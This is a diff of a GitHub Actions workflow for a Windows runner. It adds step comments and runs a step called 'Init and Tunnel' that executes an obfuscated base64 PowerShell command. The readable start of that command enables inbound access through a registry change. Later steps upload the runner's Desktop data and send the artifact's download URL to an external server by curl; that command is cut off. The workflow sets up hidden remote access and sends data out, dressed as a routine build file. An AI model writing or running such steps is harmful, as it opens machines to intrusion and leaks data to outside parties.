@@ -9,30 +9,36 @@ jobs:
     timeout-minutes: 360
 
     steps:
+      # Step 1: Checkout repository to access BAT script
       - name: Checkout repository
         uses: actions/checkout@v3
 
+      # Step 2: Download, move, and unzip artifact
       - name: Download, move, and unzip artifact
         shell: cmd
         run: .\download_move_unzip.bat
 
+      # Step 3: Init and Tunnel
       - name: Init and Tunnel
         run: |
           powershell -EncodedCommand IwAgAEUAbgBhAGIAbABlACAAaQBuAGIAbwB1AG4AZAAgAGEAYwBjAGUAcwBzAAoAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgB[...]
         timeout-minutes: 3
 
+      # Step 4: List Desktop Data contents for debugging
       - name: List Desktop Data contents (for debugging)
-        run: dir C:\Users\Administrator\Desktop\data
+        run: dir "%USERPROFILE%\Desktop\data"
         continue-on-error: true
 
+      # Step 5: Upload Desktop Data as artifact
       - name: Upload Desktop Data as "data" artifact
         id: upload_data
         uses: actions/upload-artifact@v4
         with:
           name: data
-          path: C:\Users\Administrator\Desktop\data
+          path: "%USERPROFILE%\Desktop\data"
         if: always()
 
+      # Step 6: Send artifact download URL to external server
       - name: Send artifact download URL to external server (curl)
         env:
           GITHUB_RUN_ID: ${{ github.run_id }}
